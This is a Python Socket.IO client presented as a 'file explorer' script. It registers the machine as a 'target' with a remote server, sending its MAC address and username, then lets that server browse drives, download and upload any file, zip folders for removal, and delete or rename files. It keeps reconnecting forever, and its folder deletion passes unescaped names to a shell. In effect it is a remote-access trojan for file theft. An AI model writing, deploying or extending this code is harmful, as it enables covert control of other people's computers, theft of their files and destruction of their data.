import socketio, os, zipfile, time
from uuid import uuid4, getnode
from datetime import datetime

# --------------------- SOME FUNCTIONS -------------------
def getDriveInfos():
    f = os.popen("wmic logicaldisk get name, size, FreeSpace /format:csv").read()
    while "\n\n" in f:
        f = f.replace("\n\n", "\n")
    f = f[1:-1]
    to_ret = []
    rows_ = f.split("\n")
    cols = rows_[0].split(",")
    for item in rows_[1:]:
        to_append = {}
        for idx2, item2 in enumerate(item.split(",")):
            to_append[cols[idx2]] = item2
        to_ret.append(to_append)
    return to_ret

def adv_listdir(path_):
    to_ret = []
    for item in os.listdir(path_):
        creation_date = str(datetime.fromtimestamp(os.path.getctime(os.path.join(path_, item))))
        if os.path.isfile(os.path.join(path_, item)):
            size_ = os.path.getsize(os.path.join(path_, item))
            to_ret.append({"type": "file", "size": size_, "creation_date": creation_date, "name": item})
        else:
            try:
                items_count = len(os.listdir(os.path.join(path_, item)))
            except BaseException:
                items_count = "ACCESS_DENIED"
            to_ret.append({"type": "folder", "items": items_count, "creation_date": creation_date, "name": item})
    return to_ret

def get_mac():
    try:
        mac_ = hex(getnode())[2:]
        to_ret = ""
        for i in range(0, len(mac_)-1, 2):
            to_ret += mac_[i: i+2] + ":"
        return to_ret[:-1].upper()
    except BaseException:
        return "UNDEFINED"
# ------------------------ END -------------------------

while 1:
    try:
        # url_ = "http://127.0.0.1:5000"  # JUST FOR DEVELOPMENT
        # url_ = "https://file-explowerer.onrender.com/"  # JUST FOR TESTING
        url_ = "__PLACE_RENDER_URL_HERE__"  # REPLACEMENT SHOULD BE DONE HERE

        ws = socketio.Client()

        class FileExplorerController(socketio.ClientNamespace):
            zipper_running = False
            zip_file_name = None

            def on_connect(self):
                print("CONNECTED")
                self.emit("register_target", {"mac_addr": get_mac(), "user_name": os.getenv("USERNAME")})

            def on_list_drives(self):
                self.emit("response_channel", {"drives": getDriveInfos(), "type": "drive_list"})

            def on_list_files(self, data_=None):
                if data_ is None or "path" not in data_:
                    data_ = {"path": "./"}
                self.emit("response_channel", {"medias": adv_listdir(data_["path"]), "cwd": os.getcwd(), "type": "media_list"})

            def on_switch_dir(self, data_):
                try:
                    os.listdir(data_["path"])
                    os.chdir(data_["path"])
                    self.on_list_files()
                except BaseException as e:
                    self.emit("response_channel", {"error": str(e), "type": "error_msg"})

            def on_download_file(self, data_):
                try:
                    file_size = os.path.getsize(data_["file_name"])
                    with open(data_["file_name"], "rb") as fp:
                        to_send = fp.read()[data_["seg_from"]: data_["seg_to"]]
                    if data_["seg_to"] >= file_size:
                        data_["transmission_end"] = True
                        if self.zip_file_name:
                            try:
                                os.remove(self.zip_file_name)
                            except BaseException : pass
                            self.zip_file_name = None

                    data_["seg_from"] = data_["seg_to"]
                    data_["seg_to"] += data_["chunk_size"]
                    data_["bytes"] = to_send
                    data_["type"] = "file_chunk_resp"
                    data_["current_chunk"] += 1
                    data_["total_chunks"] = file_size//data_["chunk_size"]
                    self.emit("response_channel", data_)
                except BaseException as e:
                    self.emit("response_channel", {"error": str(e), "type": "error_msg"})

            def on_upload_file(self, data_):
                try:
                    if os.path.exists(data_["file_name"]) and data_["init"]:
                        self.emit("response_channel", {"error": "FILE ALREADY EXISTS", "type": "error_msg"})
                    else:
                        if not len(data_["chunk"]):
                            self.emit("response_channel", {"msg": f"file `{data_['file_name']}` successfully!", "type": "file_uploaded"})
                            self.on_list_files()
                            return
                        with open(data_["file_name"], "ab") as fp:
                            fp.write(data_["chunk"])
                        del data_["chunk"]
                        data_["chunk_from"] = data_["chunk_to"]
                        data_["chunk_to"] += data_["chunk_size"]
                        self.emit("next_chunk", data_)
                except BaseException as e:
                    self.emit("response_channel", {"error": str(e), "type": "error_msg"})

            def on_delete_media(self, data_):
                try:
                    if data_["type"] == "file":
                        os.remove(data_["media_name"])
                        self.on_list_files()
                        self.emit("response_channel", {"msg": f"file {data_['media_name']} deleted!", "type": "success_msg"})
                    elif data_["type"] == "folder":
                        out_ = os.popen(f"rmdir /s /q \"{data_['media_name']}\"").read()
                        if len(out_) < 1:
                            self.on_list_files()
                            self.emit("response_channel", {"msg": f"folder {data_['media_name']} deleted!", "type": "success_msg"})
                        else:
                            raise Exception(out_)
                except BaseException as e:
                    self.emit("response_channel", {"error": str(e), "type": "error_msg"})

            def on_rename_media(self, data_):
                try:
                    os.rename(data_["old_name"], data_["new_name"])
                    self.on_list_files()
                    self.emit("response_channel", {"msg": f"Media successfully renamed from '{data_['old_name']}' to '{data_['new_name']}'", "type": "success_msg"})
                except BaseException as e:
                    self.emit("response_channel", {"error": f"Failed to rename\n{str(e)}", "type": "error_msg"})

            def on_create_new_file(self, data_):
                try:
                    if os.path.exists(data_["file_name"]):
                        raise Exception("file already exists")
                    with open(data_["file_name"], "ab") as fp:
                        fp.close()
                    self.on_list_files()
                    self.emit("response_channel", {"msg": f"File '{data_['file_name']}' created successfully!", "type": "success_msg"})
                except BaseException as e:
                    self.emit("response_channel", {"error": f"Failed to create file\n{str(e)}", "type": "error_msg"})

            def on_create_new_folder(self, data_):
                try:
                    os.mkdir(data_["folder_name"])
                    self.on_list_files()
                    self.emit("response_channel", {"msg": f"Folder '{data_['folder_name']}' created successfully!", "type": "success_msg"})
                except BaseException as e:
                    self.emit("response_channel", {"error": f"Failed to create folder\n{str(e)}", "type": "error_msg"})

            def on_begin_zip_folder(self, data_):
                try:
                    self.zip_file_name = str(uuid4()).replace("-", "")+".zip"
                    zip_handle = zipfile.ZipFile(self.zip_file_name, "w")
                    self.zipper_running = True
                    idx = 0
                    walker = os.walk(data_["folder_name"])  # can't use walker both time its expression evaluated due to generator object once used gets creared up.
                    for path_, dir_, files_ in walker:
                        for file_ in files_:
                            idx += 1
                            file_with_path = path_+"\\"+file_
                            zip_handle.write(file_with_path, file_with_path)
                            if not self.zipper_running: break
                        if not self.zipper_running: break

                    if self.zipper_running:
                        self.zipper_running = False
                        self.emit("response_channel", {"info": {"zip_file_name": self.zip_file_name}, "type": "zipping_done"})
                    else:
                        if self.zip_file_name:
                            try:
                                os.remove(self.zip_file_name)
                            except BaseException : pass
                            self.zip_file_name = None
                        self.emit("response_channel", {"msg": f"zipping folder cancelled successfully", "type": "zipping_cancelled"})
                except BaseException as e:
                    self.emit("response_channel", {"error": f"Failed to create zip\n{str(e)}", "type": "error_msg"})

            def on_cancle_zip_folder(self):
                self.zipper_running = False

            def on_quit_explorer(self):
                ws.disconnect()


        ws.register_namespace(FileExplorerController("/file_explorer"))
        ws.connect(url_)
        ws.wait()
    except BaseException as e:
        time.sleep(3)
        print("ERROR WHILE CONNECTING ", e)
        print("RECONNECTING...")
# python .\file_explorer_script.py --wsurl="http://isc.cc:5000"